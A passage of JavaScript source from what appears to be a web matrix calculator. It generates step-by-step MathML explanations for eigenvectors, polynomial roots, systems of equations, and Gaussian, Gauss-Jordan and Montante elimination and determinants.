  html += "</div>"; //?
  //TODO: fix

  html += createDetailsSummary(printOptions.idPrefix, [{
    type: "determinant",
    matrix: matrixWithLambdas.toString(),
    second: undefined
  }]); //?

  html += "<ol>";
  var n = -1;
  var uniqueEigenvalues = Expression.unique(eigenvalues);

  while (++n < uniqueEigenvalues.length) {
    var eigenvalue = uniqueEigenvalues[n];
    var equalsMathML = "<mo>" + (eigenvalue.isExact() ? "=" : "&asymp;") + "</mo>"; //TODO: output algebraic multiplicity

    html += "<li>";
    html += "<math>";
    html += Expression.p("Î»_" + (n + 1));
    html += equalsMathML;
    html += eigenvalue.toMathML(printOptions);
    html += "</math>";
    html += "</li>";
  }

  html += "</ol>";
  return {
    eigenvalues: eigenvalues,
    html: html
  };
};

Expression.getEigenvectorsWithSteps = function (printOptions, matrix, eigenvalues) {
  var eigenvectors = [];
  var html = "";
  html += "<div>";
  html += i18n.eigenvalues.findEigenvectorsForEveryEigenvalue.replaceAll('${Î»}', '<math>' + Expression.p('Î»') + '</math>');
  html += "</div>";
  html += "<ol>";

  for (var i = 0; i < eigenvalues.length; i += 1) {
    html += "<li>";
    var mm = matrix.subtract(Matrix.I(matrix.cols()).scale(eigenvalues[i])); // matrix - E * eigenvalue

    var fullMatrix = mm.augment(Matrix.Zero(mm.cols(), 1));
    var equalsMathML = "<mo>" + (eigenvalues[i].isExact() ? "=" : "&asymp;") + "</mo>";
    var args = {
      v: new Expression.MatrixSymbol('v'),
      A: new Expression.MatrixSymbol('A')
    }; // TODO: fix output for diagonalization - instead of `X = {{0}, {c_1}, {0}}` should be `... var c_1 = 1, then X = {{0}, {1}, {0}}`

    html += "<div class=\"anchor\" id=\"" + (printOptions.idPrefix + "-eigenvalue-" + (i + 1)) + "\">";
    html += "<math>";
    html += new Expression.Symbol('Î»_' + (i + 1)).toMathML(printOptions);
    html += equalsMathML;
    html += eigenvalues[i].toMathML(printOptions);
    html += "</math>";
    html += "</div>"; //TODO: syncronize the ExpressionParser with i18n.identityMatrixDenotation
    //TODO: a tooltip for identityMatrixDenotation - identity Matrix
    //TODO: invisible times (&it;) -> middle dot - ?

    html += "<div>";
    html += "<math>";
    html += Expression.p("A-Î»_i*I".replace(/i/g, (i + 1).toString()).replace(/I/g, i18n.identityMatrixDenotation), args, {}).replace(/&times;/g, '&sdot;');
    html += equalsMathML;
    html += new Expression.Matrix(mm).toMathML(printOptions);
    html += "</math>";
    html += "</div>"; // Av=\lambda v

    html += "<div>";
    html += "<math>" + Expression.p("A*v=Î»*v", args, {}) + "</math>";
    html += " ";
    html += i18n.eigenvalueEquationLink; //TODO: remove the link - ?

    html += "</div>"; // (A-\lambda E)v=0

    html += "<div>";
    html += "<math>" + Expression.p("(A-Î»*I)*v=0".replace(/I/g, i18n.identityMatrixDenotation), args, {}).replace(/&times;/g, '&sdot;') + "</math>";
    html += "</div>";
    html += "<div>"; //TODO: text says by "Gaussian Elimination", but really we solve it by Gauss-Jordan elimination...

    html += i18n.eigenvalues.letsSolveHomogeneouseSystem;
    html += "</div>"; //TODO:
    //html += createDetailsSummary(printOptions.idPrefix, [{type: "solve", matrix: fullMatrix.toString(), second: undefined}]);
    //TODO: Matrix.GaussMontante

    var variableNames = makeDefaultVariableNames(fullMatrix.cols() - 1);
    var solutionSet = undefined;
    var solutionHTML = "";
    solutionHTML += Expression.rowReductionGaussJordanMontante(fullMatrix, Matrix.GaussJordan, "solving", Object.assign({}, printOptions, {
      columnlines: -1
    }), function (result) {
      var tmp = Expression.solveByGaussNext(result, printOptions, variableNames);
      solutionSet = Matrix.getSolutionSet(result.matrix);
      return tmp.html;
    }, true);
    html += "<div>" + solutionHTML + "</div>";
    html += "<div>";

    for (var j = 0; j < solutionSet.basisVectors.length; j += 1) {
      var eigenvector = solutionSet.basisVectors[j];
      eigenvectors.push(eigenvector);
      var index = eigenvectors.length; //TODO: <li> - ?

      html += j !== 0 ? "; " : "";
      html += i18n.eigenvalues.Let;
      html += " ";

      for (var k = 0; k < solutionSet.variables.length; k += 1) {
        html += k !== 0 ? ", " : "";
        html += "<math>";
        html += new Expression.Symbol(variableNames[solutionSet.variables[k]]).toMathML(printOptions) + "<mo>=</mo>" + Expression.p(k === j ? 1 : 0);
        html += "</math>";
      }

      html += ", ";
      html += "<span class=\"inline-block anchor\" id=\"" + (printOptions.idPrefix + "-eigenvector-" + index) + "\">";
      html += "<math>";
      html += "<mrow style=\"font-weight: bolder\">";
      html += Expression.p("v_0=V", {
        v_0: new Expression.MatrixSymbol('v_' + index),
        V: new Expression.Matrix(eigenvector)
      }, printOptions);
      html += "</mrow>";
      html += "</math>";
      html += "</span>";
    }

    html += "</div>";
    html += "</li>";
  }

  html += "</ol>";
  return {
    html: html,
    eigenvectors: eigenvectors
  };
}; // --------------------------------------------- end ----------------------------------------------
// --------------------------------------------- end ----------------------------------------------
// 1286
//TODO: remove ?


var polyfromtable = function (m) {
  var coefficients = new Array(m.cols());

  for (var i = 0; i < m.cols(); i += 1) {
    coefficients[i] = m.e(0, m.cols() - 1 - i);
  }

  return Polynomial.from(coefficients);
};

Expression.Details.add({
  type: "polynomial-roots",
  minRows: 1,
  callback: function (printOptions, matrix, second) {
    var polynomial = polyfromtable(matrix);
    var variable = second == undefined ? undefined : second.variable;
    variable = variable == undefined ? new Expression.Symbol("x") : variable;
    printOptions = Object.assign({}, printOptions, {
      polynomialVariable: variable
    });
    var steps = "";
    var roots = Expression.getPolynomialRootsWithSteps(polynomial, function (info) {
      steps += polynomialRootsCallback(info, printOptions);
    });
    var html = "";
    html += "<div>";
    html += "<math>";
    var p = polynomial.toMathML(printOptions);
    html += p;

    if (steps !== '<mo>=</mo>' + p) {
      html += steps;
    }

    html += "<mo>=</mo>";
    html += Expression.p(0);
    html += "</math>";
    html += "</div>";
    html += "<div>";
    html += i18n.misc.roots;

    if (roots.length === 0) {
      html += " ? ";
    }

    var totalRoots = 0;
    html += "<ul>";
    var uniqueRoots = Expression.unique(roots);

    for (var k = 0; k < uniqueRoots.length; k += 1) {
      var root = uniqueRoots[k];
      var multiplicity = roots.reduce(function (count, e) { return count + (e === root ? 1 : 0); }, 0);

      for (var j = 0; j < multiplicity; j += 1) {
        html += "<li>" + "<math>" + (root.isExact() ? "" : "<mo>&asymp;</mo>") + root.toMathML(printOptions) + "</math>" + "</li>";
        totalRoots += 1;
      }
    }

    if (totalRoots < polynomial.getDegree()) {
      html += "<em>" + i18n.notAllRootsHaveBeenFound + "</em>"; //TODO: ?
    }

    html += "</ul>";
    html += "</div>";
    return html;
  }
});
Expression.Details.add({
  type: "polynomial-multiply",
  minRows: 1,
  callback: function (printOptions, matrix, second) {
    var pA = polyfromtable(matrix);
    var pB = polyfromtable(second.matrix);
    var result = pA.multiply(pB);
    return "<math>" + "<mrow>" + "<mrow><mo>(</mo>" + pA.toMathML(printOptions) + "<mo>)</mo></mrow>" + "<mo>&sdot;</mo>" + "<mrow><mo>(</mo>" + pB.toMathML(printOptions) + "<mo>)</mo></mrow>" + "</mrow>" + "<mo>=</mo>" + result.toMathML(printOptions) + "</math>";
  }
});

RPN.getPositionInfo = function () {
  return {
    input: ExpressionParser.input,
    startPosition: ExpressionParser.startPosition,
    endPosition: ExpressionParser.endPosition,
    p: RPN.p
  };
};

RPN.getMatrix = function (s) {
  // TODO: insertion with drag and drop should not freeze all because of calculations
  var matrix = undefined;

  if (matrix == undefined) {
    //TODO: fix or remove - ?
    if (/\=/.test(s)) {
      //?
      try {
        var tmp = getAugmentedSystemMatrix(s); //if (tmp != undefined) {
        //  matrix = Matrix.toMatrix(tmp.elements);
        //}

        var elements = tmp.elements;
        var variableNames = tmp.variableNames; //TODO: test

        return {
          elements: elements,
          variableNames: variableNames
        };
      } catch (error) {
        console.log(error);
      }
    }
  }

  if (matrix == undefined) {
    if (/[\t\n\r]/.test(s.trim())) {
      //try {
      //TODO: should it throw in case of errors?
      var elements = Matrix.split(s.trim());

      try {
        matrix = Matrix.toMatrix(elements);

        if (matrix.rows() === 1 && matrix.cols() === 1 && matrix.e(0, 0).unwrap() instanceof Expression.Matrix) {
          matrix = matrix.e(0, 0);
          elements = elements[0][0]; //TODO: test
        }
      } catch (error) {
        console.error(error);
      } //!new 2020-04-06
      //TODO:


      return {
        elements: elements,
        variableNames: undefined
      }; //} catch (error) {
      //  console.log(error);
      //}
    }
  } //!new 2020-07-04


  var table = getTableFromAsciiMathMatrix(s);

  if (table != null) {
    return {
      elements: table,
      variableNames: undefined
    };
  } //!
  //!!!!


  if (matrix == undefined) {
    var result = undefined;

    try {
      result = ExpressionParser.parse(s, new ExpressionParser.Context()); // to avoid simplification ({{cos(x),sin(x)},{-sin(x),cos(x)}}*{{cos(x),-sin(x)},{sin(x),cos(x)}})
      //result = ExpressionParser.parse(s);
    } catch (error) {
      // TODO: handle errors (?)
      // ???
      throw error;
    } //TODO: system of equations (?)


    matrix = result instanceof Matrix ? result : result instanceof Expression.Matrix ? result.matrix : result instanceof NonSimplifiedExpression && result.e instanceof Expression.Matrix ? result.e.matrix : undefined;
  } //!!!
  // TODO: fix: the input should match the raw input


  var elements = null;

  if (matrix != null) {
    elements = [];

    for (var i = 0; i < matrix.rows(); i += 1) {
      var row = [];

      for (var j = 0; j < matrix.cols(); j += 1) {
        row.push(matrix.e(i, j).toString());
      }

      elements.push(row);
    }
  }

  return {
    elements: elements,
    variableNames: undefined
  };
};

RPN.p = 0; //!

RPN.checkExpressions = function (textareaValue, type) {
  var resultRows = undefined; //?
  //!!!

  if (type === "system") {
    // to support custom input in SLE: 3x+y-2z=2; 2x+y-1=3; ...
    resultRows = getAugmentedSystemMatrix(textareaValue);
  } //!!!


  if (resultRows == undefined) {
    resultRows = Matrix.split(textareaValue);
  }

  var elements = resultRows;
  RPN.p = 0;

  for (var i = 0; i < elements.length; i += 1) {
    for (var j = 0; j < elements[i].length; j += 1) {
      var value = elements[i][j]; //TODO: fix

      var isValid = RPN.checkExpression(value || "0");

      if (!isValid) {
        return false;
      }

      RPN.p += value.length;
    }
  }

  return true;
};

RPN.checkExpression = function (input) {
  //return ExpressionParser.parse(input) != undefined;
  return ExpressionParser.parse(input, new ExpressionParser.Context()) != undefined;
};

RPN.runExpression = function (input, kInputValue, kInputId, matrixTableStates, printOptions) {
  //!TODO: Details?
  var details = [];

  var listener = function (e) {
    details.push({
      type: e.type,
      matrix: e.data.matrix.toString(),
      second: e.second == undefined ? undefined : e.second.matrix.toString()
    });
  };

  Expression.callback = listener;
  var x = undefined; //HACK

  var variableNames = undefined;
  var resultError = undefined;
  var expressionString = undefined;
  var resultHTML = undefined;
  var resultMatrix = undefined;

  try {
    //TODO: fix
    var test = input.replace(/\s+/g, "");

    if (test === "A*X=B" || test === "AX=B" || test === "Ax=b") {
      test = "A*X=B";
    }

    if (test === "A*X=0" || test === "AX=0") {
      test = "A*X=0";
    }

    var matrixTableAState = matrixTableStates != undefined ? matrixTableStates["A"] : undefined;
    var matrixTableBState = matrixTableStates != undefined ? matrixTableStates["B"] : undefined;

    if (test === "A*X=B" && matrixTableAState != undefined && matrixTableBState != undefined || test === "A*X=0" && matrixTableAState != undefined) {
      //TODO: type !== "system" - ?
      var a0 = Matrix.toMatrix(RPN.getElementsArray(matrixTableAState).elements);
      var b0 = test !== "A*X=B" ? Matrix.Zero(a0.rows(), 1) : Matrix.toMatrix(RPN.getElementsArray(matrixTableBState).elements); //hit({click: test  + "-" + a0.rows().toString() + "x" + a0.cols().toString() + "-" + b0.rows().toString() + "x" + b0.cols().toString()});

      if (b0.rows() === a0.rows() && b0.cols() === 1) {
        input = "solve-using-Montante-method(" + a0.augment(b0).toString() + ")";
      }
    }

    if (input.replace(/^\s+|\s+$/g, "") === "") {
      throw new RangeError("ValueMissingError:" + "expression");
    }

    x = ExpressionParser.parse(input, new ExpressionParser.Context(function (id) {
      if ((id === "k" || id === "K") && kInputValue != undefined) {
        var value = kInputValue;

        if (value.replace(/^\s+|\s+$/g, "") === "") {
          throw new RangeError("ValueMissingError:" + kInputId);
        }

        return ExpressionParser.parse(value, new ExpressionParser.Context());
      }

      if (id === "X" || id === "Y") {
        return new Expression.MatrixSymbol(id);
      }

      var matrixTableState = matrixTableStates != undefined && Object.prototype.hasOwnProperty.call(matrixTableStates, id) ? matrixTableStates[id] : undefined;

      if (matrixTableState == undefined) {
        return undefined;
      }

      var tmp = RPN.getElementsArray(matrixTableState);

      if (tmp.elements.length === 0) {
        throw new RangeError("ValueMissingError:" + matrixTableState.firstInputElementId);
      }

      var names = tmp.variableNames;
      var matrix = Matrix.toMatrix(tmp.elements);
      variableNames = names; //!

      return new Expression.Matrix(matrix);
    })); //TODO: remove

    var tmp = getResultAndHTML(x, variableNames, x.simplify(), printOptions);
    var result = tmp.result;
    resultHTML = tmp.html;
    var matrix = undefined;

    if (result instanceof Matrix) {
      matrix = result;
    } else if (result instanceof Expression.Matrix) {
      matrix = result.matrix;
    } else if (result instanceof NonSimplifiedExpression && result.e instanceof Expression.Matrix) {
      matrix = result.e.matrix;
    } else if (result instanceof Expression.Equality && result.b instanceof Expression.Matrix) {
      //!new 2018-12-29
      matrix = result.b.matrix;
    }

    resultMatrix = matrix != undefined ? matrix.toString() : "";
    expressionString = x.toString();
  } catch (error) {
    resultError = error;
  }

  Expression.callback = undefined;
  var detailsHTML = createDetailsSummary(printOptions == null ? "g" : printOptions.idPrefix, details, details.length === 1 ? 100 : 1);
  return {
    resultError: resultError,
    details: details,
    expressionString: expressionString,
    resultHTML: resultHTML,
    resultMatrix: resultMatrix,
    detailsHTML: detailsHTML
  };
};

RPN.getDetails = function (data, printOptions) {
  var callback = Expression.Details.getCallback(data.type);

  if (callback == undefined) {
    throw new Error(data.type);
  }

  var matrix = ExpressionParser.parse(data.matrix).matrix; //?

  var second = data.second != undefined ? ExpressionParser.parse(data.second).matrix : undefined;
  var html = callback(printOptions, matrix, second);
  return html;
}; // TODO: fix?
//export createDetailsSummary;
//TODO: remove createDetailsSummary


RPN.createDetailsSummary = createDetailsSummary;
globalThis.RPN = RPN;
Expression.Details.add({
  type: "system-of-equations",
  minRows: 1,
  //?
  callback: function (printOptions, nothing, system) {
    var equations = system.equations;

    if (equations == null) {
      // backward-compatibility //TODO: ?
      equations = [{
        left: system.s,
        right: system.b
      }];
    }

    var html = ""; //TODO: move

    var rows = null;
    var cols = null;

    var getNumberSolutionFor = function (condition, variable) {
      var s = condition.getSolutionFor(variable);
      return s instanceof Expression.Integer ? s.toNumber() : null;
    }; // TODO: ???


    if (equations.length === 1 && (equations[0].sign || "=") == "=") {
      //TODO: ?
      var s = equations[0].left;
      var b = equations[0].right;
      html += "<div>";
      html += "<math>";
      html += s.toMathML(printOptions) + "<mo>=</mo>" + b.toMathML(printOptions);
      html += "</math>";
      html += "</div>";

      if (s instanceof Expression.Exponentiation && Expression.has(s, Expression.MatrixSymbol) && b instanceof Expression.Matrix) {
        //TODO: ?
        s = s.inverse();
        b = b.inverse(); //TODO: condition
      } //!new 2019-12-08


      if (Expression.has(b, Expression.MatrixSymbol)) {
        //?TODO: ?
        s = s.subtract(b); //b = b.subtract(b); TODO: fix when X*{{1}}-X*{{1}}

        b = Expression.ZERO;
      } //!new 2020-14-06


      if (Expression.has(s, Expression.MatrixSymbol)) {
        //?TODO: ?
        s = s.subtract(b);
        b = Expression.ZERO;
      }

      if (!(s.subtract(b) instanceof Expression.Division)) {
        var tmp = Expression.splitX(s.subtract(b));

        if (tmp != null && tmp.x instanceof Expression.Exponentiation && tmp.x.b.isNegative()) {
          if (!Expression.has(s, Expression.Determinant)) {
            //TODO: FIX Expression.splitX(...) instead - ?
            //?
            //TODO: test, fix, remove(in case Condition will work better)
            s = s.multiply(tmp.x.inverse());
            b = b.multiply(tmp.x.inverse());
          }
        }
      }

      if ((s instanceof Expression.Addition || s instanceof Expression.Multiplication) && Expression.has(s, Expression.MatrixSymbol)) {
        //TODO: FIX BUGS!!!
        //var tmp = Expression.splitX(s);
        //cols = tmp.l != null && tmp.r != null ? tmp.l.matrix.rows() : null;
        //rows = tmp.l != null && tmp.r != null ? tmp.r.matrix.rows() : null;
        if (cols == null || rows == null) {
          var c = Condition.TRUE;

          var size = function (e) {
            if (e instanceof Expression.Addition) {
              var a = size(e.a);
              var b = size(e.b);

              if (a == null || b == null) {
                return a || b;
              }

              c = c.andZero(a.rows.subtract(b.rows));
              c = c.andZero(a.cols.subtract(b.cols));
              return a;
            }

            if (e instanceof Expression.Multiplication) {
              var a = size(e.a);
              var b = size(e.b);

              if (a == null || b == null) {
                return a || b;
              }

              c = c.andZero(a.cols.subtract(b.rows));
              return {
                rows: a.rows,
                cols: b.cols
              };
            }

            if (e instanceof Expression.Exponentiation) {
              var a = size(e.a);

              if (a == null) {
                return a;
              }

              c = c.andZero(a.cols.subtract(a.rows));
              return a;
            }

            if (e instanceof Expression.MatrixSymbol) {
              return {
                rows: new Expression.Symbol("rows" + e.symbol),
                cols: new Expression.Symbol("cols" + e.symbol)
              };
            }

            if (e instanceof Expression.Matrix) {
              return {
                rows: Expression.Integer.fromNumber(e.matrix.rows()),
                cols: Expression.Integer.fromNumber(e.matrix.cols())
              };
            }

            if (Expression.isScalar(e)) {
              return null;
            }

            if (e instanceof Expression.Determinant) {
              //TODO: ?
              return null;
            }

            throw new TypeError("NotSupportedError");
          };

          var tmp0 = size(s); //TODO: ?
          //console.log(c + '');
          //TODO: for all matrix symbols do the replacement,
          // then back (?)

          if (c.isFalse()) {
            throw new RangeError("DimensionMismatchException"); //TODO: ?
          }

          rows = getNumberSolutionFor(c, new Expression.Symbol('rows' + 'X'));
          cols = getNumberSolutionFor(c, new Expression.Symbol('cols' + 'X'));

          if (rows != null && cols == null && tmp0.rows instanceof Expression.Integer) {
            //!2021-11-04 (hack), as for square matrices the right part is lost:
            cols = tmp0.rows.toNumber();
          }
        }

        if (cols != null && rows != null) {
          var X = new Expression.Matrix(Matrix.Zero(rows, cols).map(function (e, i, j) {
            //TODO use unique symbol names (?)
            return new Expression.Symbol('x' + '_(' + (i + 1) + ',' + (j + 1) + ')');
          }));
          html += '<math>' + Expression.p("X=A", {
            A: X
          }, {}) + '</math>'; //s = RPN(s.toString(), new RPN.Context(function (id) {
          //  return id === "X" ? X : null;
          //}));

          s = Expression._map(function (something) {
            return something instanceof Expression.Symbol && something.symbol === "X" ? X : something;
          }, s);
          s = s.simplify();
        }
      }

      equations = [];

      if (s instanceof Expression.Matrix) {
        var m = s.matrix;
        var bb = new Expression.Matrix(Matrix.Zero(m.rows(), m.cols()));

        if (!b.equals(Expression.ZERO)) {
          bb = bb.add(b);
        }

        bb = bb.matrix;

        for (var i = 0; i < m.rows(); i += 1) {
          for (var j = 0; j < m.cols(); j += 1) {
            equations.push({
              left: m.e(i, j),
              right: bb.e(i, j)
            });
          }
        }
      } else {
        equations.push({
          left: s,
          right: b
        });
      }
    }

    var getX = function (rows, cols, condition) {
      var NULL = new Expression.Symbol("NULL");
      var X = Matrix.Zero(rows, cols).map(function (e, i, j) {
        //TODO use unique symbol names (?)
        var s = new Expression.Symbol('x' + '_(' + (i + 1) + ',' + (j + 1) + ')');
        var q = condition.getSolutionFor(s); //TODO: with symbols (!!!)

        return q != null && !Expression.has(q, Expression.Symbol) ? q : NULL;
      });

      for (var i = 0; i < rows; i += 1) {
        for (var j = 0; j < cols; j += 1) {
          if (X.e(i, j) === NULL) {
            return null;
          }
        }
      }

      return new Expression.Matrix(X);
    }; //TODO: fix


    html += "<div>";
    html += "<math>";
    html += "<mrow><mo>{</mo>";
    html += '<mtable rowspacing="0ex" columnalign="left">';
    var signs = {
      '=': '=',
      '!=': 'â‰ ',
      '>': '>',
      '<': '<'
    };

    for (var i = 0; i < equations.length; i += 1) {
      html += "<mtr><mtd>" + equations[i].left.toMathML(printOptions) + "<mo>" + signs[equations[i].sign || "="] + "</mo>" + equations[i].right.toMathML(printOptions) + "</mtd></mtr>";
    }

    html += '</mtable>';
    html += "</mrow>";
    html += "</math>";
    html += "</div>"; //TODO: is linear - ?
    //TODO: matrices - ?

    var c = Condition.TRUE;

    for (var i = 0; i < equations.length; i += 1) {
      var x = equations[i].left.subtract(equations[i].right);
      var sign = equations[i].sign || "=";

      if (sign === "=") {
        c = c.andZero(x);
      } else if (sign === '!=') {
        c = c.andNotZero(x);
      } else if (sign === '>') {
        c = c.andGreaterZero(x);
      } else if (sign === '<') {
        c = c.andGreaterZero(x.negate());
      } else {
        throw new TypeError();
      }
    }

    html += "<p>" + i18n.systems.answer + "</p>";
    html += "<p>";

    if (c.isFalse()) {
      html += i18n.systems.thereAreNoSolutions; // "&minus;";//TODO: ?
    } else if (c.isTrue()) {
      html += "âœ“"; //TODO: ?
    } else {
      var X = cols != null && rows != null ? getX(rows, cols, c) : null;

      if (X != null) {
        html += "<math>" + Expression.p("X=A", {
          A: X
        }, printOptions) + "</math>";
      } else {
        html += "<math>" + c.toMathML(printOptions) + "</math>";
      }
    }

    html += "</p>";
    return html;
  }
});
})();
(function () {
"use strict";
/*global i18n, Expression, Matrix, NonSimplifiedExpression*/


var getSolveDetails = function (printOptions, matrix, variableNames, title, method) {
  if (matrix.cols() < 1) {
    //?
    throw new RangeError("ValueMissingError:A-textarea"); //TODO: fix
  } //if (variableNames == undefined) {


  var m = matrix.slice(0, matrix.rows(), 0, matrix.cols() - 1);
  var b = matrix.slice(0, matrix.rows(), matrix.cols() - 1, matrix.cols());
  matrix = Matrix.trimRight(m).augment(b); //}

  var html = "";
  html += "<h4>" + title + "</h4>"; //html += "<div>" + i18n.unused.systems.augmentedMatrixOfTheSystem + "</div>";

  html += "<div>" + i18n.systems.convertTheAugmentedMatrixIntoTheRowEchelonForm + "</div>";
  html += Expression.rowReductionGaussJordanMontante(matrix, method, "solving", Object.assign({}, printOptions, {
    columnlines: -1
  }), function (result) {
    var tmp = Expression.solveByGaussNext(result, printOptions, variableNames);
    return tmp.html;
  });
  return html;
};

Expression.Details.add({
  type: "solve-using-Gaussian-elimination",
  i18n: function () {
    return i18n.slu.solveByGauss;
  },
  minRows: 1,
  callback: function (printOptions, matrix, variableNames) {
    return getSolveDetails(printOptions, matrix, variableNames, i18n.systems.solutionByGaussianElimination, Matrix.Gauss);
  }
});
Expression.Details.add({
  type: "solve-using-Gauss-Jordan-elimination",
  i18n: function () {
    return i18n.slu.solveByJordanGauss;
  },
  minRows: 1,
  callback: function (printOptions, matrix, variableNames) {
    return getSolveDetails(printOptions, matrix, variableNames, i18n.systems.solutionByGaussJordanElimination, Matrix.GaussJordan);
  }
});
Expression.Details.add({
  type: "solve-using-Montante-method",
  i18n: function () {
    return i18n.det.methodOfMontante;
  },
  minRows: 1,
  priority: 1,
  //TODO: ?
  callback: function (printOptions, matrix, variableNames) {
    return getSolveDetails(printOptions, matrix, variableNames, i18n.systems.solutionByMethodOfMontante, Matrix.GaussMontante);
  }
});

Expression.rowReduceChangeToHTMLMontante = function (args, printOptions, containerId, k, stepCondition) {
  var tooltipId = 'tooltip-' + containerId + '-' + k;

  var t = function (r, c, k) {
    var matrix = [['a_(pivotRow,pivotColumn)', 'a_(pivotRow,j)'], ['a_(i,pivotColumn)', 'a_(i,j)']];
    var det = new Expression.Determinant(new Expression.Matrix(Matrix.I(2).map(function (e, i, j) {
      return new Expression.Symbol(matrix[i][j].replaceAll('pivotRow', r + 1).replaceAll('pivotColumn', c + 1));
    }))).toMathML({
      useMatrixContainer: false
    });
    return "<mrow>" + "<mfrac>" + '<mrow id="' + tooltipId + '">' + det + '</mrow>' + new Expression.Symbol('p_${k}'.replaceAll('${k}', k + 1).replaceAll('p_0', '1')).toMathML() + "</mfrac>" + "<mo>&rarr;</mo>" + new Expression.Symbol('a_(i,j)').toMathML() + "</mrow>";
  };

  var cellId = function (matrixId, i, j) {
    return containerId + "-" + matrixId + "-" + i + "-" + j;
  };

  var html = "";

  if (true) {
    if (args.type === "swap" || args.type === "swap-negate") {
      html += Expression.rowReduceChangeToHTML(args, printOptions, containerId, k, stepCondition);
    } else if (args.type === "pivot") {
      var a0 = new Expression.Matrix(args.oldMatrix).toMathML(Object.assign({}, printOptions, {
        columnlines: printOptions.columnlines,
        cellIdGenerator: function (i, j) {
          return cellId(k, i, j);
        },
        pivotCell: {
          i: args.pivotRow,
          j: args.pivotColumn
        }
      }));
      var pivotElementText = "<mpadded width=\"+0.8em\" lspace=\"+0.4em\">" + "<munder accentunder=\"true\">" + "<mo stretchy=\"false\">~</mo>" + "<munder accentunder=\"true\">" + "<mtext>" + i18n.eliminationDetails.pivotElement + "</mtext>" + "<munder accentunder=\"true\">" + "<mrow>" + new Expression.Symbol("p_" + (k + 1)).toMathML() + "<mo>=</mo>" + new Expression.Symbol("a_(" + (args.pivotRow + 1) + "," + (args.pivotColumn + 1) + ")").toMathML() + "<mo>=</mo>" + args.oldMatrix.e(args.pivotRow, args.pivotColumn).toMathML(printOptions) + "</mrow>" + (stepCondition.isTrue() ? "" : "<munder accentunder=\"true\">") + t(args.pivotRow, args.pivotColumn, k - 1) + (stepCondition.isTrue() ? "" : stepCondition.toMathML(printOptions)) + (stepCondition.isTrue() ? "" : "</munder>") + "</munder>" + "</munder>" + "</munder>" + "</mpadded>";
      html += "<math>";
      html += a0 + pivotElementText;
      html += "</math>";
      k += 1;
      var text = "";
      var tooltip = '<a class="a-tooltip" data-for="' + tooltipId + '" hidden>' + "<math>" + Expression.p("(a_(pivotRow,pivotColumn)*a_(i,j)-a_(i,pivotColumn)*a_(pivotRow,j))".replaceAll('pivotRow', (args.pivotRow + 1).toString()).replaceAll('pivotColumn', (args.pivotColumn + 1).toString())) + "</math>" + '</a>';
      text += tooltip;

      for (var targetRow = 0; targetRow < args.oldMatrix.rows(); targetRow += 1) {
        if (targetRow !== args.pivotRow) {
          text += "<div>";

          for (var i = 0; i < args.oldMatrix.cols(); i += 1) {
            var highlight = "<a class=\"a-highlight\" data-for=\"" + cellId(k, targetRow, i) + "\" data-highlight=\"" + "#" + cellId(k - 1, args.pivotRow, args.pivotColumn) + ", " + "#" + cellId(k - 1, targetRow, i) + ", " + "#" + cellId(k - 1, targetRow, args.pivotColumn) + ", " + "#" + cellId(k - 1, args.pivotRow, i) + ", " + "#" + cellId(k, targetRow, i) + "\"></a>";
            text += "<a class=\"a-tooltip\" data-for=\"" + cellId(k, targetRow, i) + "\" hidden>" + "<math>" + Expression.p("a_(" + (targetRow + 1) + "," + (i + 1) + ")=(a*b-c*d)/p=r", {
              a: args.oldMatrix.e(args.pivotRow, args.pivotColumn),
              b: args.oldMatrix.e(targetRow, i),
              c: args.oldMatrix.e(targetRow, args.pivotColumn),
              d: args.oldMatrix.e(args.pivotRow, i),
              p: args.previousPivot,
              r: args.newMatrix.e(targetRow, i)
            }, printOptions) + "</math>" + "</a>" + highlight;
          }

          text += "</div>";
        }
      }

      html += "<span hidden>" + text + "</span>";
    } else {
      throw new TypeError(args.type);
    }
  } //TODO: mathml, not html, no internal <math></math>


  return html;
};

var getDeterminantDetails = function (printOptions, matrix, method, title, header) {
  if (!matrix.isSquare()) {
    throw new RangeError("NonSquareMatrixException");
  }

  var html = "";
  html += "<div>";
  html += "<math>";
  html += new Expression.Determinant(new Expression.Matrix(matrix)).toMathML(printOptions) + "<mo>=</mo><mi>?</mi>";
  html += "</math>";
  html += "</div>"; //?

  if (header != undefined) {
    html += "<h4>";
    html += header;
    html += "</h4>";
  }

  html += "<p>" + title + "</p>";
  html += Expression.rowReductionGaussJordanMontante(matrix, method, "determinant", printOptions, function (tmp) {
    var rowEchelonMatrix = tmp.matrix;
    var html = "";
    html += "<div>";
    html += "<math>";
    html += new Expression.Determinant(new Expression.Matrix(matrix)).toMathML(printOptions);
    html += "<mo>=</mo>";

    if (method === Matrix.Gauss) {
      html += new Expression.Determinant(new Expression.Matrix(rowEchelonMatrix)).toMathML(printOptions);
      html += "<mo>=</mo>";
      var result = rowEchelonMatrix.determinant();

      if (!result.equals(Expression.ZERO)) {
        var det = rowEchelonMatrix.e(0, 0);
        det = new NonSimplifiedExpression(det);

        for (var j = 1; j < rowEchelonMatrix.rows(); j += 1) {
          det = new Expression.Multiplication(det, rowEchelonMatrix.e(j, j)); //? usage of Expression.Multiplication to get 4 * 5 * 6 ...

          det = new NonSimplifiedExpression(det);
        }

        html += det.toMathML(printOptions);
        html += "<mo>=</mo>";
      }

      html += result.toMathML(printOptions);
    } else {
      var result = tmp.stoppedAtRow !== -1 ? Expression.ZERO : rowEchelonMatrix.e(rowEchelonMatrix.rows() - 1, rowEchelonMatrix.cols() - 1);
      html += result.toMathML(printOptions);
    }

    html += "</math>";
    html += "</div>";
    return html;
  });
  return html;
};

Expression.Details.add({
  type: "determinant-Gauss",
  i18n: function () {
    return i18n.det.methodOfGauss;
  },
  minRows: 3,
  callback: function (printOptions, matrix) {
    return getDeterminantDetails(printOptions, matrix, Matrix.Gauss, i18n.determinantDetails.start, undefined);
  }
});
Expression.Details.add({
  type: "determinant-Montante",
  i18n: function () {
    return i18n.det.methodOfMontante;
  },
  minRows: 3,
  priority: 1,
  //TODO: ?
  callback: function (printOptions, matrix) {
